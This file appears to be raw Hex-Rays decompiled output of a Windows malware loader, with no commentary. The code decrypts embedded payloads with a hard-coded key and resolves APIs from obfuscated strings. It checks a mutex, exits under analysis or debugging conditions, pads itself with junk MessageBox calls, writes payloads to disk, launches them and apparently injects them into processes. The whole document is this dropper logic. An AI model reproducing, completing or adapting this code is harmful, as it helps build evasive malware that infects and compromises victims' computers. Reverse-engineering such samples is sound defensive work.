/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401000();
int sub_40100A();
void __noreturn sub_40101F(); // weak
// int __userpurge sub_40102C@<eax>(int@<ebx>, int, int, int, int);
// int __usercall sub_401CC4@<eax>(int@<ebx>, int, _WORD *);
void __cdecl sub_401F61(HANDLE hProcess);
// char *__usercall sub_4020C0@<eax>(int@<ebx>, int, _DWORD *);
_BYTE *__cdecl sub_4022AB(int);
const char *sub_4023B7();
int sub_4024FF();
LPSTR __cdecl sub_402656(LPCSTR lpString1);
int sub_40291D();
BOOL sub_402A17();
_BYTE *__cdecl sub_402AB1(int, _BYTE *, int);
int sub_402BB2();
BOOL sub_402CA0();
int sub_402CF9();
BOOL sub_402E0C();
int sub_402E83();
int __cdecl sub_402ED9(int, int, unsigned int, unsigned int);
int sub_4030E9();
int __cdecl sub_40349F(int, int);
// int __usercall StartAddress@<eax>(int@<ebx>);
int __cdecl sub_4039DE(int);
// _BYTE *__usercall sub_403AE0@<eax>(int@<ebx>, int, SIZE_T dwBytes, int);
BOOL __cdecl sub_403B92(LPVOID lpMem);
char *__cdecl sub_403BAC(char *, const char *);
CHAR *__cdecl sub_403BCE(LPCSTR lpName);
int __cdecl sub_403BF7(char *, _BYTE *);
_BYTE *__cdecl sub_403C19(int, _BYTE *);
char *__cdecl sub_403C90(char *, const char *);
LPVOID __cdecl sub_403CA5(SIZE_T dwBytes);
// char *__usercall sub_403CBE@<eax>(int@<ebx>, char *, char, unsigned int);
_BYTE *__cdecl sub_403CF1(_BYTE *, int, int);
unsigned int __cdecl sub_403D13(char *a1);
int __cdecl sub_403D24(int);
int sub_403D33();
// void __usercall __noreturn start(int@<ebx>);
BOOL sub_403E2D();
unsigned int __cdecl sub_403E42(char *a1, char **a2, unsigned int a3);
void __cdecl __noreturn sub_403F15(UINT uExitCode); // idb
int __cdecl sub_403F4A(int (**)(void), unsigned int, int);
int sub_403F71();

//-------------------------------------------------------------------------
// Data declarations

// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern int (__stdcall *MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
const CHAR String[] = "TzRUcsXB"; // idb
_UNKNOWN unk_4040EC; // weak
int (*off_405000[2])(void) = { NULL, &sub_401000 }; // weak
_UNKNOWN unk_405008; // weak
int (*off_40500C[2])(void) = { NULL, &sub_403E2D }; // weak
_UNKNOWN unk_405014; // weak
int (*dword_405018)(void) = NULL; // weak
_UNKNOWN unk_40501C; // weak
int (*dword_405020)(void) = NULL; // weak
_UNKNOWN unk_405024; // weak
CHAR asc_405030[1] = ":"; // idb
CHAR LibFileName[1] = "?"; // idb
CHAR a5[1] = "5"; // idb
CHAR asc_40505C[1] = "#"; // idb
CHAR byte_405068 = '\x17'; // idb
CHAR byte_405078 = '\x17'; // idb
CHAR byte_405084 = '\x17'; // idb
CHAR byte_405090 = '\x03'; // idb
CHAR byte_40509C = '\x1A'; // idb
CHAR byte_4050B4 = '\x1A'; // idb
CHAR byte_4050CC = '\x1A'; // idb
CHAR byte_4050E0 = '\x1A'; // idb
CHAR byte_4050F4 = '\x1A'; // idb
CHAR byte_405104 = '\x1A'; // idb
CHAR byte_405120 = '\x02'; // idb
CHAR byte_405130 = '\x12'; // idb
CHAR asc_405140[1] = "\a"; // idb
CHAR byte_405150 = '\x18'; // idb
CHAR byte_405160 = '\x18'; // idb
_UNKNOWN unk_405170; // weak
_UNKNOWN unk_4051B4; // weak
CHAR ModuleName[1] = "0"; // idb
CHAR asc_4051CC[1] = "\a"; // idb
CHAR a5_1[4] = "5\n;\n"; // idb
CHAR a0_2[1] = "0"; // idb
CHAR asc_4051F4[4] = "$\t&:"; // idb
CHAR byte_405200 = '\x1D'; // idb
CHAR byte_405210 = '\x1D'; // idb
CHAR byte_405224 = '\x1D'; // idb
CHAR byte_405238 = '\x1D'; // idb
CHAR a7Pav8[9] = "!\t7'PAv&8"; // idb
CHAR asc_405258[1] = "'"; // idb
CHAR ProcName = '\x06'; // idb
CHAR byte_405274 = '\x06'; // idb
CHAR byte_405288 = '\x06'; // idb
CHAR byte_405298 = '\x06'; // idb
CHAR byte_4052A8 = '\x06'; // idb
CHAR asc_4052B4[1] = "\a"; // idb
CHAR byte_4052C4 = '\x19'; // idb
_UNKNOWN unk_4052D0; // weak
_UNKNOWN unk_4052E8; // weak
CHAR a5_0[2] = "\a5"; // idb
CHAR asc_405350[1] = "#"; // idb
CHAR asc_405354[1] = "'"; // idb
CHAR a5U9[5] = "5\n\"U9"; // idb
CHAR a0_4[1] = "0"; // idb
CHAR asc_405364[1] = "\a"; // idb
CHAR asc_405370[4] = "\b\t+&"; // idb
CHAR byte_40537C = '\x15'; // idb
CHAR byte_405384 = '\0'; // idb
char a7C[6] = ";\n7;c"; // weak
_UNKNOWN unk_405390; // weak
CHAR byte_40539C = '\x19'; // idb
CHAR byte_4053A8 = '\x17'; // idb
CHAR asc_4053B4[1] = "\a"; // idb
_UNKNOWN unk_4053C8; // weak
_UNKNOWN unk_4053DC; // weak
_UNKNOWN unk_405418; // weak
CHAR byte_405424 = '\x15'; // idb
CHAR byte_405440 = '\x17'; // idb
CHAR byte_405458 = '\x12'; // idb
char byte_405460[] = { 'd' }; // weak
int dword_405474 = 1; // weak
_BYTE byte_405478[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40547C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405480[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405484[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405488[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40548C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405490[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405494[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405498[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40549C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054A0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054A4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054A8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054AC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054B0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054B4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054B8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054BC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054C0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054C4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054C8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054CC[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_4054D0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054D4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054D8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054DC[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_4054E0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054E4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054E8[4] = { 124, 124, 0, 0 }; // weak
CHAR String2[2] = "1"; // idb
CHAR a1[2] = "1"; // idb
char asc_4054F4[2] = "\\"; // weak
CHAR a0[2] = "0"; // idb
char a2_1[2] = "2"; // weak
char a1_1[2] = "1"; // weak
CHAR a2[2] = "2"; // idb
char asc_405508[2] = "\\"; // weak
char asc_40550C[2] = "-"; // weak
CHAR asc_405510[2] = "."; // idb
char asc_405514[2] = "\""; // weak
char asc_405518[2] = "\""; // weak
char asc_40551C[3] = "%%"; // weak
char asc_405520[3] = "%%"; // weak
char asc_405524[3] = "%%"; // weak
char asc_405528[3] = "%%"; // weak
CHAR a0_0[2] = "0"; // idb
char a0_5[2] = "0"; // weak
char a1_2[2] = "1"; // weak
CHAR a2_0[2] = "2"; // idb
char asc_40553C[2] = "\\"; // weak
char a1_3[2] = "1"; // weak
CHAR a1_0[2] = "1"; // idb
CHAR a0_1[2] = "0"; // idb
char a0_6[2] = "0"; // weak
CHAR a0_3[2] = "0"; // idb
char a1_4[2] = "1"; // weak
CHAR asc_405558[2] = "\\"; // idb
char asc_40555C[2] = "\\"; // weak
char a1_5[2] = "1"; // weak
CHAR a3[2] = "3"; // idb
int dword_405568 = 1; // weak
LPSTR lpString2 = NULL; // idb
CHAR byte_405578[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR String1[39] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_4055C8[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_4055F1[2] = { '\0', '\0' }; // idb
CHAR byte_4055F3[4] = { '\0', '\0', '\0', '\0' }; // idb
CHAR byte_4055F7[2] = { '\0', '\0' }; // idb
CHAR Name[17] = { '\0', '\0', '\0', '\0', '\0', '\0', '\0',  }; // idb
char byte_40560A[41]; // weak
CHAR byte_405633[261]; // idb
char byte_405738[6]; // weak
CHAR byte_40573E[295]; // idb
CHAR byte_405865[2]; // idb
CHAR byte_405867[2]; // idb
CHAR byte_405869[2]; // idb
CHAR byte_40586B[6]; // idb
CHAR byte_405871[9]; // idb
CHAR byte_40587A[6]; // idb
CHAR byte_405880[6]; // idb
CHAR byte_405886[41]; // idb
_UNKNOWN unk_4058AF; // weak
_UNKNOWN unk_4058B1; // weak
CHAR byte_4058B3[41]; // weak
CHAR byte_4058DC[120]; // idb
_UNKNOWN unk_405954; // weak
_UNKNOWN unk_40597D; // weak
CHAR byte_405A82[1698]; // weak
CHAR byte_406124[8]; // idb
int dword_40612C; // weak
LPSTR dword_406130; // idb
LPSTR lpString1; // idb
int dword_406138; // weak
int dword_40613C; // weak
HMODULE dword_406140; // idb
HMODULE hModule; // idb
HMODULE dword_406148; // idb
HMODULE dword_40614C; // idb
HMODULE dword_406150; // idb
HMODULE dword_406154; // idb
int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406160)(_DWORD); // weak
int (__stdcall *dword_406164)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406168)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40616C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406178)(_DWORD); // weak
int (__stdcall *dword_40617C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406180)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
CHAR Buffer[1024]; // idb
int dword_406588; // weak
int dword_40658C; // weak
int dword_4065A0[32]; // weak
HANDLE hHeap; // idb
int (*dword_406624)(void); // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  return sub_40100A();
}

//----- (0040100A) --------------------------------------------------------
int sub_40100A()
{
  int result; // eax

  result = lstrlenA("TzRUcsXB");
  dword_40612C = result;
  return result;
}
// 40612C: using guessed type int dword_40612C;

//----- (0040101F) --------------------------------------------------------
void __noreturn sub_40101F()
{
  ExitProcess(0);
}
// 40101F: using guessed type void __noreturn sub_40101F();

//----- (0040102C) --------------------------------------------------------
int __userpurge sub_40102C@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5)
{
  const CHAR *v6; // eax
  const char *v7; // eax
  CHAR *v8; // eax
  CHAR *v9; // eax
  int v10; // [esp+2Ch] [ebp-84h]
  unsigned int v11; // [esp+34h] [ebp-7Ch] BYREF
  __int16 v12; // [esp+38h] [ebp-78h]
  unsigned int v13[3]; // [esp+3Ch] [ebp-74h] BYREF
  LPSTR v14; // [esp+48h] [ebp-68h]
  int v15; // [esp+4Ch] [ebp-64h]
  char *v16; // [esp+50h] [ebp-60h]
  int v17; // [esp+54h] [ebp-5Ch]
  char *v18; // [esp+58h] [ebp-58h]
  __int16 v19; // [esp+5Ch] [ebp-54h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+60h] [ebp-50h]
  int v21; // [esp+64h] [ebp-4Ch]
  char *v22; // [esp+68h] [ebp-48h]
  HANDLE hHandle; // [esp+6Ch] [ebp-44h]
  __int16 v24; // [esp+70h] [ebp-40h]
  int v25; // [esp+74h] [ebp-3Ch]
  int v26; // [esp+78h] [ebp-38h]
  __int16 v27; // [esp+7Ch] [ebp-34h]
  __int16 v28; // [esp+80h] [ebp-30h]
  int v29; // [esp+84h] [ebp-2Ch]
  LPSTR lpString1; // [esp+88h] [ebp-28h]
  int i; // [esp+8Ch] [ebp-24h]
  int v32; // [esp+90h] [ebp-20h]
  int v33; // [esp+94h] [ebp-1Ch]
  int v34; // [esp+98h] [ebp-18h]
  int v35; // [esp+9Ch] [ebp-14h]
  int v36; // [esp+A0h] [ebp-10h]
  char *v37; // [esp+A4h] [ebp-Ch]
  int v38; // [esp+A8h] [ebp-8h]
  LPCSTR lpString2; // [esp+ACh] [ebp-4h]

  v24 = 2685;
  i = 0;
  sub_402E83();
  ::lpString1 = (LPSTR)sub_403CA5(0x105u);
  ::lpString2 = (LPSTR)sub_403CA5(0x105u);
  dword_406130 = (LPSTR)sub_403CA5(0x105u);
  v12 = 4816;
  sub_4030E9();
  v32 = 2645;
  v35 = 3506;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  dword_406140 = LoadLibraryA(LibFileName);
  v33 = 3474;
  hModule = LoadLibraryA(::a5);
  v38 = 2969;
  dword_406148 = LoadLibraryA(asc_405030);
  v36 = 14;
  dword_40614C = LoadLibraryA(asc_40505C);
  dword_406150 = LoadLibraryA(a7Pav8);
  v15 = 4111;
  dword_406154 = LoadLibraryA(asc_405258);
  v28 = 348;
  dword_406158 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, &ProcName);
  v29 = 2125;
  dword_40615C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      hModule,
                                                                                      &byte_405274);
  dword_406160 = (int (__stdcall *)(_DWORD))GetProcAddress(hModule, &byte_4052A8);
  dword_406164 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(hModule, &byte_405288);
  dword_406168 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      hModule,
                                                                                      &byte_405298);
  dword_40616C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      dword_406154,
                                                                                      asc_4052B4);
  v25 = 4376;
  dword_406170 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                              dword_406140,
                                                                                              &byte_405084);
  dword_406174 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_406140, &byte_405090);
  v26 = 1906;
  v19 = 1453;
  dword_406178 = (int (__stdcall *)(_DWORD))GetProcAddress(dword_406140, &byte_405078);
  dword_406180 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_406140, &byte_405120);
  dword_40617C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_406148, &byte_405104);
  dword_40613C = sub_40291D();
  dword_405474 = sub_402A17();
  v13[2] = (unsigned int)sub_40101F;
  v34 = 207;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v13[1] = (unsigned int)ExceptionList;
  if ( sub_402E0C() )
    return 0;
  GetModuleFileNameA(0, ::lpString2, 0x104u);
  v21 = 1084;
  v6 = sub_4022AB(0);
  lstrcpyA(::lpString1, v6);
  if ( !::lpString1 )
    sub_403C90(::lpString1, ::lpString2);
  v37 = 0;
  v16 = 0;
  v13[0] = 0;
  v11 = 0;
  v17 = 2092;
  v37 = sub_4020C0(a1, (int)&unk_405390, v13);
  if ( !v37 || !v13[0] )
    return 0;
  v37 = (char *)sub_402ED9((int)v37, (int)"TzRUcsXB", v13[0], dword_40612C);
  if ( !v37 || !v13[0] )
    return 0;
  lpString2 = 0;
  lpString2 = sub_403C19((int)v37, byte_405478);
  if ( !lpString2 )
    return 0;
  sub_403C90(byte_405578, lpString2);
  lpString2 = sub_403C19(0, byte_40547C);
  lstrcpyA(String1, lpString2);
  lpString2 = sub_403C19(0, byte_405480);
  lstrcpyA(byte_4055C8, lpString2);
  lpString2 = sub_403C19(0, byte_405484);
  lstrcpyA(byte_4055F1, lpString2);
  lpString2 = sub_403C19(0, byte_405488);
  sub_403C90(byte_4055F3, lpString2);
  lpString2 = sub_403C19(0, byte_40548C);
  lstrcpyA(byte_4055F7, lpString2);
  lpString2 = sub_403C19(0, byte_405490);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  sub_403C90(byte_40560A, lpString2);
  lpString2 = sub_403C19(0, byte_405494);
  lstrcpyA(byte_405633, lpString2);
  lpString2 = sub_403C19(0, byte_405498);
  sub_403C90(byte_405738, lpString2);
  lpString2 = sub_403C19(0, byte_40549C);
  lstrcpyA(byte_40573E, lpString2);
  lpString2 = sub_403C19(0, byte_4054A0);
  sub_403C90(byte_405865, lpString2);
  lpString2 = sub_403C19(0, byte_4054A4);
  sub_403C90(byte_405867, lpString2);
  lpString2 = sub_403C19(0, byte_4054A8);
  lstrcpyA(byte_405869, lpString2);
  lpString2 = sub_403C19(0, byte_4054AC);
  lstrcpyA(byte_40586B, lpString2);
  lpString2 = sub_403C19(0, byte_4054B0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  lstrcpyA(byte_405871, lpString2);
  lpString2 = sub_403C19(0, byte_4054B4);
  lstrcpyA(byte_40587A, lpString2);
  lpString2 = sub_403C19(0, byte_4054B8);
  lstrcpyA(byte_405880, lpString2);
  lpString2 = sub_403C19(0, byte_4054BC);
  sub_403C90(byte_405886, lpString2);
  lpString2 = sub_403C19(0, byte_4054C0);
  sub_403C90(Name, lpString2);
  lpString2 = sub_403C19(0, byte_4054C4);
  lstrcpyA(byte_406124, lpString2);
  v27 = 2284;
  for ( i = 0; i < 5; ++i )
  {
    lpString2 = sub_403C19(0, byte_4054C8);
    lstrcpyA((LPSTR)&unk_4058AF + 9 * i, lpString2);
    if ( sub_403BF7((char *)&unk_4058AF + 9 * i, byte_4054CC) )
    {
      lpString2 = sub_403C19(0, byte_4054D0);
      lstrcpyA((LPSTR)&unk_4058B1 + 9 * i, lpString2);
      lpString2 = sub_403C19(0, byte_4054D4);
      sub_403C90(&byte_4058B3[9 * i], lpString2);
    }
  }
  for ( i = 0; i < 5; ++i )
  {
    lpString2 = sub_403C19(0, byte_4054D8);
    lstrcpyA(&byte_4058DC[424 * i], lpString2);
    if ( sub_403BF7(&byte_4058DC[424 * i], byte_4054DC) )
    {
      lpString2 = sub_403C19(0, byte_4054E0);
      lstrcpyA((LPSTR)&unk_405954 + 424 * i, lpString2);
      lpString2 = sub_403C19(0, byte_4054E4);
      sub_403C90((char *)&unk_40597D + 424 * i, lpString2);
      lpString2 = sub_403C19(0, byte_4054E8);
      lstrcpyA(&byte_405A82[424 * i], lpString2);
    }
  }
  CreateMutexA(0, 1, Name);
  if ( GetLastError() == 183 )
    return 0;
  if ( !lstrcmpA(byte_405865, String2) && (sub_402BB2() || sub_402CF9()) )
    return 0;
  if ( !lstrcmpA(byte_405867, ::a1) && sub_402CA0() )
    return 0;
  v7 = sub_402656(::lpString2);
  sub_403C90(::lpString2, v7);
  lpString1 = (LPSTR)sub_403CA5(0x105u);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  if ( dword_40613C && !dword_405474 && sub_403BF7(byte_405886, &a5U9[4]) )
  {
    if ( sub_403BF7(byte_405886, a0_4) )
    {
      v8 = sub_403BCE(asc_405364);
      lstrcpyA(lpString1, v8);
      sub_403BAC(lpString1, asc_4054F4);
      lstrcatA(lpString1, byte_405886);
    }
    else
    {
      sub_403C90(lpString1, ::lpString1);
    }
  }
  else
  {
    lstrcpyA(lpString1, ::lpString2);
  }
  hHandle = 0;
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  if ( lstrcmpA(byte_4058DC, a0) && ::lpString1 )
    hHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
  v18 = (char *)sub_403CA5(0x105u);
  v14 = (LPSTR)sub_403CA5(0x105u);
  v22 = 0;
  for ( i = 0; i <= 5; ++i )
  {
    sub_403C90(v18, byte_405871);
    v22 = (char *)sub_403CA5(0xAu);
    sub_402AB1(i, v22, 10);
    sub_403BAC(v18, v22);
    if ( !i
      || !sub_403BF7((char *)&unk_4058B1 + 9 * i - 9, a2_1)
      || !sub_403BF7((char *)&unk_4058B1 + 9 * i - 9, a1_1) && dword_406138 )
    {
      v16 = sub_4020C0(a1, (int)v18, &v11);
      if ( !v16 )
        break;
      if ( !v11 )
        break;
      v16 = (char *)sub_402ED9((int)v16, (int)"TzRUcsXB", v11, dword_40612C);
      if ( !v16 || !v11 )
        break;
      if ( !i || lstrcmpA((LPCSTR)&unk_4058AF + 9 * i - 9, ::a2) )
      {
        if ( !sub_401CC4(a1, (int)lpString1, v16) )
          return 0;
      }
      else
      {
        v9 = sub_403BCE(&byte_405384);
        lstrcpyA(v14, v9);
        sub_403BAC(v14, asc_405508);
        sub_403BAC(v14, v22);
        sub_403BAC(v14, asc_40550C);
        lstrcatA(v14, Name);
        lstrcatA(v14, asc_405510);
        lstrcatA(v14, &byte_4058B3[9 * i - 9]);
        v10 = dword_406170(v14, 0x40000000, 0, 0, 2, 0, 0);
        if ( v10 == -1 )
          break;
        dword_406174(v10, v16, v11, &v11, 0);
        dword_406178(v10);
        dword_40616C(0, a7C, v14, 0, 0, 1);
      }
    }
    v16 = 0;
    v11 = 0;
    sub_403B92(v22);
  }
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  if ( hHandle )
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
  return 0;
}
// 40101F: using guessed type void __noreturn sub_40101F();
// 405474: using guessed type int dword_405474;
// 405478: using guessed type _BYTE byte_405478[4];
// 40547C: using guessed type _BYTE byte_40547C[4];
// 405480: using guessed type _BYTE byte_405480[4];
// 405484: using guessed type _BYTE byte_405484[4];
// 405488: using guessed type _BYTE byte_405488[4];
// 40548C: using guessed type _BYTE byte_40548C[4];
// 405490: using guessed type _BYTE byte_405490[4];
// 405494: using guessed type _BYTE byte_405494[4];
// 405498: using guessed type _BYTE byte_405498[4];
// 40549C: using guessed type _BYTE byte_40549C[4];
// 4054A0: using guessed type _BYTE byte_4054A0[4];
// 4054A4: using guessed type _BYTE byte_4054A4[4];
// 4054A8: using guessed type _BYTE byte_4054A8[4];
// 4054AC: using guessed type _BYTE byte_4054AC[4];
// 4054B0: using guessed type _BYTE byte_4054B0[4];
// 4054B4: using guessed type _BYTE byte_4054B4[4];
// 4054B8: using guessed type _BYTE byte_4054B8[4];
// 4054BC: using guessed type _BYTE byte_4054BC[4];
// 4054C0: using guessed type _BYTE byte_4054C0[4];
// 4054C4: using guessed type _BYTE byte_4054C4[4];
// 4054C8: using guessed type _BYTE byte_4054C8[4];
// 4054CC: using guessed type _BYTE byte_4054CC[4];
// 4054D0: using guessed type _BYTE byte_4054D0[4];
// 4054D4: using guessed type _BYTE byte_4054D4[4];
// 4054D8: using guessed type _BYTE byte_4054D8[4];
// 4054DC: using guessed type _BYTE byte_4054DC[4];
// 4054E0: using guessed type _BYTE byte_4054E0[4];
// 4054E4: using guessed type _BYTE byte_4054E4[4];
// 4054E8: using guessed type _BYTE byte_4054E8[4];
// 40612C: using guessed type int dword_40612C;
// 406138: using guessed type int dword_406138;
// 40613C: using guessed type int dword_40613C;
// 406158: using guessed type int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40615C: using guessed type int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406160: using guessed type int (__stdcall *dword_406160)(_DWORD);
// 406164: using guessed type int (__stdcall *dword_406164)(_DWORD, _DWORD, _DWORD);
// 406168: using guessed type int (__stdcall *dword_406168)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40616C: using guessed type int (__stdcall *dword_40616C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406170: using guessed type int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406174: using guessed type int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406178: using guessed type int (__stdcall *dword_406178)(_DWORD);
// 40617C: using guessed type int (__stdcall *dword_40617C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
